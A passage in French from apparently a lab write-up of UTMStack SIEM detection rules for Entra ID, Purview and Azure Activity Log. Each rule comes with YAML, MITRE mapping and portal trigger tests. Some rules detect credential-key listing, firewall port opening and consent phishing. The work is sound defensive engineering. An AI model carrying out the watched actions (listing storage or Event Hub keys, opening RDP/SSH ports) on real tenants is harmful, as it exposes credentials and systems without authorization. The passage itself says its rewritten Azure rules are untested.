Les règles Impossible Travel et Mailbox Activity opèrent sur un plan complémentaire : elles détectent l'usage du compte depuis un autre pays, que l'attaquant ait rejoué un cookie ou ouvert une nouvelle session. Cette trace est précieuse pour l'investigation post-incident : elle permet de reconstituer la timeline et d'identifier le vecteur d'attaque. La v11.2 comptait aussi M5 (MFA Required Interrupt), retirée en v11.3.0 : l'événement qu'elle surveillait est l'étape normale de toute connexion avec MFA.

---

### M5 : MFA Required Interrupt on Sign-In

> 🗄️ **Retirée en v11.3.0.** `UserStrongAuthClientAuthNRequiredInterrupt` n'est pas un signal : c'est l'étape normale de chaque connexion avec MFA. La règle sera remplacée par une règle de fatigue MFA (refus répétés), écrite à partir d'un vrai événement de test. Le fichier reste disponible dans [`rules/retirees/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/retirees) pour les environnements où cette règle native n'existe pas.

Une tentative de connexion Entra ID a été interrompue par une demande MFA (`LogonError UserStrongAuthClientAuthNRequiredInterrupt`, ErrorNumber 50074). Ce signal est normal lors d'une première connexion depuis un nouvel appareil, mais devient suspect associé à une IP externe inconnue ou un pays inhabituel. Dans un scénario AiTM, l'interrupt MFA reste visible dans les logs même si le proxy a relayé le token de session.

**Faux positifs documentés :** dans les environnements Intune, les appareils conformes peuvent générer cet event lors de connexions dont le statut de conformité n'a pas encore été propagé. Le champ `event.DeviceProperties` montre `IsCompliant = False` même pour un appareil enregistré et conforme dans Intune. Ce décalage est inhérent à la synchronisation asynchrone entre Intune et Entra ID au moment de l'authentification : le statut réel est bien conforme, mais l'event est loggé avant que la propagation soit complète.

**Technique MITRE :** T1078.004 · Valid Accounts: Cloud Accounts

```yaml
name: Entra ID - MFA Required Interrupt on Sign-In
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1078.004 - Valid Accounts Cloud Accounts
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1078/004/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-sign-ins
description: 'Une tentative de connexion Entra ID a été interrompue par une demande MFA (LogonError UserStrongAuthClientAuthNRequiredInterrupt, ErrorNumber 50074). Ce signal est normal lors d''une première connexion depuis un nouvel appareil, mais devient suspect s''il est associé à une IP externe inconnue ou à un pays inhabituel. Dans un scénario AiTM (Adversary-in-the-Middle), le proxy malveillant relaie le token de session après que l''utilisateur a complété le MFA, l''interrupt lui-même reste visible dans les logs. Next Steps: 1. Vérifier si l''IP source (origin.ip) est habituelle pour cet utilisateur. 2. Contrôler le pays d''origine via origin.geolocation.countryCode. 3. Vérifier si une connexion réussie (UserLoggedIn) a suivi dans la même fenêtre temporelle depuis la même IP. 4. Révoquer les sessions actives via Entra ID si compromission suspectée. 5. Corréler avec les events o365-impossible-travel si le pays est inhabituel.'
where: |-
  equals("action", "UserLoginFailed") &&
  contains("event.Workload", "AzureActiveDirectory") &&
  equals("event.LogonError", "UserStrongAuthClientAuthNRequiredInterrupt")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** ouvrir une session de navigation privée et se connecter à `portal.office.com`. Sur un appareil non enregistré dans Intune ou lors d'une première connexion depuis un nouveau navigateur, Entra ID demande le MFA. Fermer la fenêtre avant de valider le MFA : l'event `UserLoginFailed` avec `LogonError = UserStrongAuthClientAuthNRequiredInterrupt` est généré même si la fenêtre est fermée sans validation.

---

### M6 : Member Added to Group by User

Un compte utilisateur a été ajouté à un groupe Entra ID par un utilisateur humain. Les ajouts automatiques par des ServicePrincipals Microsoft (Microsoft Approval Management, Entra Connect) sont exclus.

**Pourquoi exclure les ServicePrincipals mais pas les comptes de service ?** Lors des tests, l'unique event `Add member to group.` présent en base était l'ajout automatique de `ch11-test` au groupe "Tous les utilisateurs" par `Microsoft Approval Management` : un service Microsoft interne qui gère les flux d'approbation lors de la synchronisation Entra Connect. Le filtre `!contains("origin.user", "ServicePrincipal_")` élimine ces ajouts automatiques tout en conservant les ajouts effectués par des comptes de service humainement contrôlés dont l'UPN ne commence pas par ce préfixe.

**Technique MITRE :** T1098.003 · Account Manipulation: Additional Cloud Roles

✅ **Statut v11.3.0 :** validée. Aucune règle native ne la recouvre.

```yaml
name: Entra ID - Member Added to Group by User
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 1
category: Privilege Escalation
technique: T1098.003 - Account Manipulation Additional Cloud Roles
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1098/003/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs
description: 'Un compte utilisateur a été ajouté à un groupe Entra ID par un utilisateur humain (Add member to group., Workload AzureActiveDirectory). Les ajouts automatiques par des ServicePrincipals Microsoft (Microsoft Approval Management, Entra Connect) sont exclus. Un ajout non autorisé à un groupe de sécurité ou à un groupe M365 peut conférer des droits d''accès à des ressources sensibles. Next Steps: 1. Identifier le membre ajouté via event.ObjectId. 2. Identifier le groupe cible, rechercher Group.DisplayName dans event.ModifiedProperties. 3. Vérifier si l''acteur (origin.user) est autorisé à modifier ce groupe. 4. Contrôler les droits associés au groupe cible. 5. Retirer le membre si l''ajout n''est pas justifié.'
where: |-
  equals("action", "Add member to group.") &&
  contains("event.Workload", "AzureActiveDirectory") &&
  !contains("origin.user", "ServicePrincipal_")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** dans le portail Entra ID → Groupes → sélectionner un groupe de sécurité existant → Membres → Ajouter des membres → sélectionner un utilisateur de test. L'alerte contient `event.ObjectId` (UPN du membre ajouté) et `event.ModifiedProperties` avec `Group.DisplayName` (nom du groupe cible).

---

### M7 : User Account Created Outside Sync Process

Un compte utilisateur a été créé directement dans Entra ID, hors du processus de synchronisation Entra Connect. La règle exclut les créations via `ConnectSyncProvisioning` car elles représentent le flux normal de synchronisation AD→Entra.

**Contexte de l'exclusion :** dans ce tenant, tous les comptes passent par Entra Connect (gest-srv (serveur membre du domaine) héberge le connecteur). L'unique event `Add user.` présent en base avant le test était la création de `ch11-test@lan.local` par `ConnectSyncProvisioning_GEST-SRV_...` : un ServicePrincipal Entra Connect. Sans l'exclusion, chaque nouvel utilisateur créé dans l'AD on-premise génèrerait une alerte lors de sa synchronisation vers Entra ID.

**Technique MITRE :** T1136.003 · Create Account: Cloud Account

✅ **Statut v11.3.0 :** validée. Aucune règle native ne la recouvre.

```yaml
name: Entra ID - User Account Created Outside Sync Process
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 1
category: Persistence
technique: T1136.003 - Create Account Cloud Account
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1136/003/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs
description: 'Un compte utilisateur a été créé directement dans Entra ID, hors du processus de synchronisation Entra Connect (Add user., Workload AzureActiveDirectory). La création manuelle d''un compte cloud contourne les contrôles IAM on-premise et peut indiquer une tentative de persistance post-compromission. Les créations via Entra Connect (ConnectSyncProvisioning) sont exclues car elles représentent le flux normal de synchronisation AD→Entra. Next Steps: 1. Identifier le compte créé via event.ObjectId. 2. Vérifier si le compte est autorisé dans le processus RH/IT. 3. Contrôler l''acteur ayant effectué la création via origin.user. 4. Vérifier si le compte a reçu des droits ou licences après sa création. 5. Désactiver le compte si non autorisé et investiguer le vecteur initial.'
where: |-
  equals("action", "Add user.") &&
  contains("event.Workload", "AzureActiveDirectory") &&
  !contains("origin.user", "ConnectSyncProvisioning")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** dans le portail Entra ID → Utilisateurs → Nouvel utilisateur → Créer un utilisateur → saisir un UPN cloud (`test-m7@lan.local`). Ce compte est créé directement dans Entra ID sans passer par l'AD on-premise : `origin.user` sera l'administrateur humain, pas `ConnectSyncProvisioning`. Supprimer le compte après validation.

---

### M10 : Purview Sensitive Data Auto-Label Rule Match

Une règle d'étiquetage automatique Microsoft Purview a détecté des données sensibles et a appliqué un label de confidentialité en mode Enforce. Cet event (`AutoSensitivityLabelRuleMatch`, Workload Exchange, RecordType 75) est généré côté serveur Exchange Online : pas par le client Outlook.

**Pourquoi Enforce et pas Simulate ?** En mode Simulate, Exchange scanne les emails et génère des events `AutoSensitivityLabelRuleMatch` à titre informatif sans appliquer le label. En mode Enforce, le label est appliqué automatiquement. La règle ne filtre que les events Enforce car les events Simulate ne représentent pas une action effective sur les données.

**Technique MITRE :** T1567 · Exfiltration Over Web Service

✅ **Statut v11.3.0 :** validée par un test réel avec des documents fictifs (Business Premium avec le module Purview Suite dans le lab). `origin.user` y contient un identifiant numérique, pas un UPN.

```yaml
name: Purview - Sensitive Data Auto-Label Rule Match
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Data Loss Prevention
technique: T1567 - Exfiltration Over Web Service
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1567/
  - https://learn.microsoft.com/en-us/purview/apply-sensitivity-label-automatically
  - https://learn.microsoft.com/en-us/purview/dlp-learn-about-dlp
description: 'Une règle d''étiquetage automatique Microsoft Purview a détecté des données sensibles et a appliqué un label de confidentialité (AutoSensitivityLabelRuleMatch, mode Enforce). Cet event indique que des données protégées circulent dans Exchange ou SharePoint. Les emails de notification DLP internes (notifications-utmstack, MipLabelsAgent) sont exclus pour éviter les boucles d''alertes. Surveiller les flux inattendus, un email contenant des données RH ou financières envoyé vers une adresse externe est un signal fort. Next Steps: 1. Identifier la politique déclenchée via event.PolicyName et la règle via event.ExecutionRuleName. 2. Identifier le label appliqué via event.LabelName. 3. Vérifier si le destinataire ou le chemin de partage est approprié pour ce niveau de confidentialité. 4. Corréler avec les events DLPRuleMatch si une politique DLP couvre les mêmes données. 5. Vérifier si l''expéditeur est autorisé à manipuler des données de ce niveau de sensibilité.'
where: |-
  equals("action", "AutoSensitivityLabelRuleMatch") &&
  contains("event.RuleMode", "Enforce") &&
  !contains("origin.user", "notifications-") &&
  !contains("origin.user", "MipLabelsAgent")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** envoyer depuis `demo@lan.local` vers une adresse externe un email contenant un document avec des données sensibles couvertes par la politique d'auto-labeling (dans ce lab : un document Word contenant un numéro AVS). Exchange Online applique automatiquement le label `4 : RH-Confidentiel` et génère l'event. L'alerte contient `event.PolicyName`, `event.ExecutionRuleName`, `event.LabelName` et `event.ExchangeMetaData`.

**Voir section "La boucle DLP" ci-dessus** pour comprendre pourquoi les exclusions `!contains("origin.user", "notifications-")` et `!contains("origin.user", "MipLabelsAgent")` sont indispensables.

---

### M2 : OAuth Application Consent Granted

Un utilisateur ou un administrateur a accordé son consentement à une application OAuth tierce dans Entra ID. Les attaques par consentement OAuth malveillant (Consent Phishing) consistent à faire approuver une application qui dispose de droits étendus sans vol de mot de passe.

**Technique MITRE :** T1528 · Steal Application Access Token

✅ **Statut v11.3.0 :** validée. Aucune règle native ne la recouvre.

```yaml
name: Entra ID - OAuth Application Consent Granted
dataTypes:
  - o365
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Persistence
technique: T1528 - Steal Application Access Token
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1528/
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs
  - https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/consent-and-permissions-overview
description: 'Un utilisateur ou un administrateur a accordé son consentement à une application OAuth tierce dans Entra ID. Les attaques par consentement OAuth malveillant (Consent Phishing, T1550.001) consistent à faire approuver par l''utilisateur une application légitime en apparence qui dispose en réalité de droits étendus (lecture des emails, accès OneDrive, envoi au nom de l''utilisateur). Ce vecteur est utilisé pour obtenir un accès persistant sans vol de mot de passe. Next Steps: 1. Identifier l''application via event.ObjectId. 2. Vérifier les permissions accordées dans le portail Entra ID (Entra ID → Applications d''entreprise). 3. Contrôler si l''application est connue et approuvée par l''IT. 4. Révoquer le consentement si l''application est suspecte. 5. Vérifier les activités post-consentement (accès Exchange, SharePoint) depuis l''AppId de l''application.'
where: |-
  equals("action", "Consent to application.") &&
  contains("event.Workload", "AzureActiveDirectory")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** dans le portail Entra ID → Applications d'entreprise → sélectionner une application avec des autorisations configurées (ex: UTMStack O365 Agent) → Sécurité → Autorisations → **Accorder un consentement d'administrateur pour [tenant]**. Confirmer dans la boîte de dialogue. L'alerte contient `event.ObjectId` (AppId de l'application), `event.ModifiedProperties` avec les scopes accordés (`ConsentContext.IsAdminConsent`, `ConsentAction.Permissions`).

---

## Série A : Azure Activity Log

Les règles A couvrent les événements Azure Activity Log collectés via l'Event Hub et indexés dans `v11-log-azure-*` avec `dataType = azure`. Deux structures coexistent dans l'index : Activity Log (`log.operationName`, en majuscules) et Event Grid (`log.data.operationName`, en casse mixte). Les règles A ciblent principalement Activity Log. Elles ont été validées en live en août 2026. L'intégration Azure du lab a depuis été désactivée pour des raisons de coût : ces règles ne peuvent plus être retestées dans ce lab. Les fichiers YAML sont disponibles dans [`rules/azure/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules/azure).

> ⚠️ **Statut v11.3.0 : non revalidées.** L'intégration Azure du lab est désactivée. Les règles A1 à A10 ont été réécrites sur le modèle des règles natives v11.3.0, qui utilisent `event.azureKind` (`activity` ou `eventgrid`), `event.azureOperation` (nom de l'opération, commun aux deux structures) et `actionResult`. Les blocs YAML de cette section montrent ces réécritures. **Aucune n'a été testée sur un événement réel.** Le texte qui les accompagne (champs, tests, faux positifs) décrit la validation d'août 2026 en v11.2 et cite donc des champs `log.*`. A8 et A9 ont été réduites pour ne plus doublonner des règles natives, et renommées. **A11 n'est pas migrée** : faute de connaître les champs d'un échec en v11.3.0, son YAML est resté en `log.*` et ne se déclenchera pas. Une session de validation, avec réactivation temporaire de l'intégration, est prévue.

### Prérequis infrastructure : Event Hub SKU Standard

**Event Hub SKU Standard requis** : le SKU Essentiel (anciennement Basic) limite à un seul Consumer Group (`$Default`). Lorsque UTMStack et Azure Monitor lisent simultanément depuis `$Default`, les messages sont consommés en compétition : certains events arrivent dans OpenSearch uniquement avec le champ `raw` brut, sans aucun champ `log.*` extrait. Le moteur de corrélation UTMStack ne peut pas évaluer `raw` : les règles A ne déclenchent pas sur ces events mal parsés.

Ce comportement a été observé en pratique : les events du 11 août étaient correctement mappés (`log.operationName` présent dans `_source`), ceux du 12 août arrivaient uniquement avec `raw`. L'accès concurrent au Consumer Group `$Default` par plusieurs services Azure au moment d'une activité intense sur le portail était la cause.

La solution est de passer l'espace de noms Event Hub en **SKU Standard** et de créer un Consumer Group dédié `utmstack` dans l'instance Event Hub. UTMStack est ensuite reconfiguré pour utiliser ce Consumer Group. Avec un Consumer Group exclusif, UTMStack lit tous les messages sans compétition et le parsing est systématiquement correct.

**Diagnostic setting** : toutes les catégories doivent être activées dans le paramètre de diagnostic de la subscription Azure : Administrative, Security, ServiceHealth, Alert, Recommendation, Policy, Autoscale, ResourceHealth.

### Particularités du moteur

`log.operationName` est indexé en `text` et contient les opérations en **MAJUSCULES**. Utiliser `contains()` pour les filtres. Le champ `log.resultType` a trois valeurs possibles par opération : `Start` (début de l'opération), `Accept` (acceptée par Azure), `Success` (terminée avec succès). Le filtre `contains("log.resultType", "Success")` permet de n'alerter que sur les opérations abouties.

---

### A1 : Storage Account Keys or SAS Token Listed

Une opération de listing des clés d'accès ou de génération de token SAS d'un compte de stockage Azure a été détectée. Les clés de stockage donnent un accès complet aux données : leur listing est un signal de reconnaissance ou d'exfiltration de credentials.

**Volume d'alertes élevé attendu** : dans ce lab, les services automatiques Azure (Network Watcher, Event Grid, UTMStack lui-même pour lire les checkpoints du Consumer Group) listent régulièrement les clés pour leurs opérations internes. Ces accès se font via des ServicePrincipals avec des rôles explicites (`Reader and Data Access`, `Azure EventGrid Service BuiltIn Role`). La tentation d'exclure les ServicePrincipals est forte : mais un ServicePrincipal compromis peut effectuer exactement les mêmes opérations avec les mêmes rôles qu'un ServicePrincipal légitime. Les exclusions sur `principalType` ne sont donc pas appliquées. L'analyste SOC contextualise via `origin.ip` (une IP Microsoft interne connue est différente d'une IP externe inconnue) et `log.identity.authorization.evidence.role`.

**Technique MITRE :** T1552 · Unsecured Credentials (approximation : `listKeys` passe par l'API de gestion Azure, pas par l'API de métadonnées des VM)

```yaml
name: Azure - Storage Account Keys or SAS Token Listed
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1552 - Unsecured Credentials
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1552/
  - https://learn.microsoft.com/en-us/azure/storage/common/storage-account-keys-manage
description: 'Une opération de listing des clés d''accès ou de génération de token SAS d''un compte de stockage Azure a été détectée (listKeys, ListServiceSas). Les clés de stockage donnent un accès complet aux données, leur listing par un compte non autorisé ou depuis une IP externe est un signal fort d''exfiltration de credentials. Next Steps: 1. Identifier le principal ayant effectué l''opération via event.azureActor. 2. Vérifier si le rôle RBAC attribué autorise cette opération. 3. Contrôler l''IP source via origin.ip, une IP externe inconnue est suspecte. 4. Vérifier les accès au compte de stockage dans les heures suivantes. 5. Effectuer une rotation des clés si l''accès est non autorisé.'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)^Microsoft\\.Storage/storageAccounts/listKeys/action$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Comptes de stockage → sélectionner un compte → Sécurité + réseau → Clés d'accès → cliquer sur **Afficher** à côté d'une clé. L'opération `MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION` est enregistrée avec `resultType = Success` et `origin.ip` correspondant à l'adresse IP depuis laquelle le portail Azure a été consulté.

---

### A2 : Resource Group Deleted

Un groupe de ressources Azure a été supprimé. La suppression d'un resource group entraîne la suppression irréversible de toutes les ressources qu'il contient.

**Technique MITRE :** T1485 · Data Destruction

```yaml
name: Azure - Resource Group Deleted
dataTypes:
  - azure
impact:
  confidentiality: 2
  integrity: 3
  availability: 3
category: Impact
technique: T1485 - Data Destruction
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1485/
  - https://learn.microsoft.com/en-us/azure/azure-resource-manager/management/manage-resource-groups-portal
description: 'Un groupe de ressources Azure a été supprimé. La suppression d''un resource group entraîne la suppression irréversible de toutes les ressources qu''il contient. Dans un scénario d''attaque, cette action peut être utilisée pour détruire des preuves ou provoquer une interruption de service. Next Steps: 1. Identifier l''auteur de la suppression via event.azureActor. 2. Vérifier si la suppression était planifiée et autorisée. 3. Contrôler quelles ressources ont été supprimées. 4. Vérifier si des sauvegardes existent pour les ressources critiques. 5. Investiguer les connexions et activités de l''auteur dans les heures précédant la suppression.'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)/resourceGroups/delete$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Groupes de ressources → **Créer** un nouveau groupe vide (ex: `test-siem`) → une fois créé, le **Supprimer**. L'opération `MICROSOFT.RESOURCES/SUBSCRIPTIONS/RESOURCEGROUPS/DELETE` apparaît avec `resultType = Success` et `log.identity.authorization.evidence.principalType = User` + `role = Owner`.

---

### A3 : Virtual Machine Deallocated or Deleted

Une machine virtuelle Azure a été désallouée ou supprimée. La désallocation arrête la VM et libère les ressources de calcul : les données persistent sur le disque mais la VM n'est plus accessible.

**Technique MITRE :** T1529 · System Shutdown/Reboot

```yaml
name: Azure - Virtual Machine Deallocated or Deleted
dataTypes:
  - azure
impact:
  confidentiality: 2
  integrity: 3
  availability: 3
category: Impact
technique: T1529 - System Shutdown/Reboot
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1529/
  - https://learn.microsoft.com/en-us/azure/virtual-machines/states-billing
description: 'Une machine virtuelle Azure a été désallouée ou supprimée (deallocate/delete). La désallocation arrête la VM et libère les ressources de calcul, dans un contexte d''attaque, cela peut être utilisé pour interrompre des services ou effacer des preuves. Next Steps: 1. Identifier l''auteur de l''opération via event.azureActor. 2. Vérifier si l''opération était planifiée. 3. Contrôler si d''autres VMs ont été affectées simultanément. 4. Vérifier l''état des sauvegardes de la VM. 5. Redémarrer la VM si l''arrêt n''était pas autorisé.'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)^Microsoft\\.Compute/virtualMachines/(deallocate/action|delete)$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Machines virtuelles → sélectionner une VM de test (`demo-utmstack`) → **Arrêter** (qui déclenche la désallocation). Attendre que l'opération soit complète. L'event `MICROSOFT.COMPUTE/VIRTUALMACHINES/DEALLOCATE/ACTION` avec `resultType = Success` arrive dans l'index dans les 5-10 minutes suivant l'opération.

**Correction :** la suppression d'une VM s'enregistre sous `MICROSOFT.COMPUTE/VIRTUALMACHINES/DELETE`, sans `/ACTION`. L'ancienne expression régulière ne la détectait pas. La version corrigée couvre les deux opérations. Elle n'a pas pu être retestée en live, l'intégration Azure du lab ayant été désactivée : elle a été vérifiée hors ligne sur les noms d'opération (`.../DEALLOCATE/ACTION` et `.../DELETE`, les suppressions Azure ne portant pas le suffixe `/ACTION`).

---

### A4a : Network Security Group Created or Modified

Un groupe de sécurité réseau Azure (NSG) a été créé ou modifié dans sa globalité. Ce signal est moins précis que A4b : il couvre notamment la création de nouveaux NSG lors de déploiements légitimes. À corréler avec d'autres activités Azure inhabituelles.

**Technique MITRE :** T1562.007 · Impair Defenses: Disable or Modify Cloud Firewall

```yaml
name: Azure - Network Security Group Created or Modified
dataTypes:
  - azure
impact:
  confidentiality: 2
  integrity: 2
  availability: 2
category: Defense Evasion
technique: T1562.007 - Impair Defenses Disable or Modify Cloud Firewall
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/007/
  - https://learn.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview
description: 'Un groupe de sécurité réseau Azure (NSG) a été créé ou modifié dans sa globalité. La création d''un nouveau NSG peut indiquer la mise en place d''une nouvelle infrastructure, légitime ou non. À corréler avec d''autres activités Azure inhabituelles. Next Steps: 1. Identifier le NSG créé ou modifié via event.resourceId. 2. Vérifier si la création est liée à un déploiement planifié. 3. Contrôler l''auteur via event.azureActor. 4. Vérifier les règles appliquées au NSG.'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)^Microsoft\\.Network/networkSecurityGroups/write$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Groupes de sécurité réseau → **Créer** un nouveau NSG (`test-nsg`). La création génère `MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/WRITE` avec `resultType = Success`. La règle A6 (ARM Deployment) déclenche aussi en parallèle car le portail Azure crée un déploiement ARM implicite lors de la création d'un NSG.

---

### A4b : Network Security Group Rule Added or Modified

Une règle de sécurité individuelle dans un NSG Azure a été ajoutée ou modifiée. Ce signal est plus suspect que A4a : un attaquant qui a compromis un compte Azure va typiquement ajouter une règle ciblée pour ouvrir un port (RDP 3389, SSH 22, WinRM 5985) plutôt que de recréer un NSG complet.

**Pourquoi deux règles distinctes pour les NSG ?** Les opérations sur un NSG génèrent deux types d'events distincts selon le niveau de modification : `NETWORKSECURITYGROUPS/WRITE` quand le NSG entier est créé ou modifié, et `NETWORKSECURITYGROUPS/SECURITYRULES/WRITE` quand une règle individuelle est ajoutée ou modifiée. Ces deux opérations ont des profils de risque différents. A4b (règle individuelle) justifie un impact plus élevé car c'est le pattern typique d'un attaquant qui ouvre chirurgicalement un port d'accès.

**Technique MITRE :** T1562.007 · Impair Defenses: Disable or Modify Cloud Firewall

```yaml
name: Azure - Network Security Group Rule Added or Modified
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 3
  availability: 2
category: Defense Evasion
technique: T1562.007 - Impair Defenses Disable or Modify Cloud Firewall
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1562/007/
  - https://learn.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview
description: 'Une règle de sécurité individuelle dans un NSG Azure a été ajoutée ou modifiée. Ce pattern est plus suspect que la modification du NSG entier, un attaquant qui a compromis un compte Azure va typiquement ajouter une règle ciblée pour ouvrir un port (RDP 3389, SSH 22, WinRM 5985) plutôt que de recréer un NSG complet. Next Steps: 1. Identifier la règle modifiée via event.resourceId (contient le nom de la règle). 2. Vérifier si un port sensible a été ouvert (RDP, SSH, WinRM, RPC). 3. Contrôler l''auteur via event.azureActor. 4. Vérifier si la modification est liée à un déploiement planifié. 5. Supprimer la règle si non autorisée.'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)^Microsoft\\.Network/networkSecurityGroups/securityRules/write$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Groupes de sécurité réseau → sélectionner un NSG existant (`demo-utmstack-nsg`) → Règles de sécurité entrantes → **Ajouter** une règle (ex: port 80, any source, Allow). L'event `MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE` avec `resultType = Success` apparaît. Le nom de la règle est visible dans `log.resourceId`.

---

### A5 : Event Hub Authorization Keys Listed

Les clés d'autorisation d'un espace de noms Event Hub Azure ont été listées. Ces clés SAS permettent d'envoyer et de recevoir des messages : leur exposition compromet l'intégrité du pipeline de collecte de logs.

**Contexte spécifique au lab :** l'Event Hub `utmstack-azure` est le pipeline de collecte des logs Azure vers UTMStack. Une compromission des clés SAS `azure-monitor-send` ou `utmstack-listen` permettrait à un attaquant d'injecter de faux logs dans UTMStack ou de perturber la collecte : aveuglant le SIEM au moment d'une attaque. C'est précisément pourquoi cette opération mérite une alerte dédiée.

**Technique MITRE :** T1552 · Unsecured Credentials (approximation : `listKeys` passe par l'API de gestion Azure, pas par l'API de métadonnées des VM)

```yaml
name: Azure - Event Hub Authorization Keys Listed
dataTypes:
  - azure
impact:
  confidentiality: 3
  integrity: 2
  availability: 1
category: Credential Access
technique: T1552 - Unsecured Credentials
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1552/
  - https://learn.microsoft.com/en-us/azure/event-hubs/authorize-access-shared-access-signature
description: 'Les clés d''autorisation d''un espace de noms Event Hub Azure ont été listées (listKeys). Ces clés permettent d''envoyer et de recevoir des messages depuis l''Event Hub, leur exposition compromet l''intégrité du pipeline de données. Dans ce lab, l''Event Hub est utilisé par UTMStack pour collecter les logs Azure, une compromission de ces clés permettrait à un attaquant d''injecter de faux logs ou de perturber la collecte. Next Steps: 1. Identifier le principal ayant listé les clés via event.azureActor. 2. Vérifier si l''accès est légitime. 3. Effectuer une rotation des clés si compromis. 4. Vérifier l''intégrité des logs collectés dans la fenêtre temporelle.'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)^Microsoft\\.EventHub/.*/listKeys/action$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** Azure → Event Hubs → espace de noms `utmstack-azure` → Stratégies d'accès partagé → cliquer sur une politique (ex: `azure-monitor-send`) → les clés primaire et secondaire s'affichent. L'opération `MICROSOFT.EVENTHUB/NAMESPACES/AUTHORIZATIONRULES/LISTKEYS/ACTION` est enregistrée avec `log.identity.authorization.scope` contenant le nom de la politique consultée.

---

### A6 : ARM Deployment Executed

Un déploiement ARM (Azure Resource Manager) a été exécuté. Les templates ARM permettent de créer ou modifier un ensemble de ressources Azure en une seule opération : ils peuvent être utilisés pour déployer des backdoors ou modifier des configurations de sécurité.

**Déclenchements implicites attendus :** le portail Azure crée automatiquement un déploiement ARM nommé pour chaque ressource créée via l'interface graphique. Par exemple, la création d'un NSG `test-nsg` génère automatiquement un déploiement ARM nommé `CreateNetworkSecurityGroupBladeV2-20260813122935`. Ce comportement est documenté honnêtement : la règle A6 aura donc un volume d'alertes corrélé avec l'activité de création de ressources via le portail.

**Technique MITRE :** T1072 · Software Deployment Tools

```yaml
name: Azure - ARM Deployment Executed
dataTypes:
  - azure
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Execution
technique: T1072 - Software Deployment Tools
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1072/
  - https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/overview
description: 'Un déploiement ARM (Azure Resource Manager) a été exécuté. Les templates ARM permettent de créer ou modifier un ensemble de ressources Azure en une seule opération, ils peuvent être utilisés pour déployer des backdoors, modifier des configurations de sécurité ou provisionner des ressources non autorisées. Next Steps: 1. Identifier le template déployé et les ressources créées ou modifiées. 2. Vérifier l''auteur du déploiement via event.azureActor. 3. Contrôler si le déploiement était planifié et autorisé. 4. Examiner le contenu du template si disponible. 5. Supprimer les ressources non autorisées.'
where: |-
  regexMatch("event.azureKind", "(?i)^(activity|eventgrid)$") &&
  regexMatch("event.azureOperation", "(?i)/deployments/write$") &&
  equalsIgnoreCase("actionResult", "success")
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** créer n'importe quelle ressource Azure via le portail (NSG, VM, IP publique) : le déploiement ARM implicite déclenche automatiquement A6. Pour un déploiement ARM explicite, utiliser Azure → Déployer un modèle personnalisé avec un template JSON minimal.

---

### A7 : Role Assignment Created or Deleted

